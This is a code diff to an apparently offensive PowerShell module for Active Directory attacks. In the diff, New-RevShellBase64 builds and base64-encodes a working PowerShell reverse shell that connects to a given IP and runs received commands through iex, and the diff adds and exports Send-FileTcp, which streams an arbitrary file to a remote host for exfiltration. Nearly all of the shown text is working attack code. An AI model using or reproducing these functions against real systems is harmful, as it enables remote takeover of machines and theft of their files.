@@ -119,19 +119,44 @@ function Get-ADComputerProperty {
 function New-RevShellBase64 {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$ip,
+        [string]$Ip,
 
         [Parameter()]
-        [int]$port = 9001
+        [int]$Port = 9001
     )
 
-    $command = '$client = New-Object System.Net.Sockets.TCPClient("' + $ip + '",' + $port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    $command = '$client = New-Object System.Net.Sockets.TCPClient("' + $Ip + '",' + $Port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 
     $encoded = [Convert]::ToBase64String($bytes)
 
     Write-Host $encoded
+}
+
+function Send-FileTcp {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$Ip,
+
+        [Parameter()]
+        [int]$Port = 9001,
+
+        [Parameter(Mandatory=$true)]
+        [string]$Filepath
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient($Ip, $Port)
+    $stream = $client.GetStream()
+    $fileStream = [System.IO.File]::OpenRead($Filepath)
+    $buffer = New-Object byte[] 4096
+    while (($read = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+        $stream.Write($buffer, 0, $read)
+    }
+    $stream.Flush()
+    $fileStream.Close()
+    $stream.Close()
+    $client.Close()
 }
 
 Export-ModuleMember -Function Get-ADObjectAcl
@@ -141,3 +166,4 @@ Export-ModuleMember -Function Grant-ADGroupAttributeWritePermission
 Export-ModuleMember -Function Add-NewADGroupMember
 Export-ModuleMember -Function Get-ADComputerProperty
 Export-ModuleMember -Function New-RevShellBase64
+Export-ModuleMember -Function Send-FileTcp
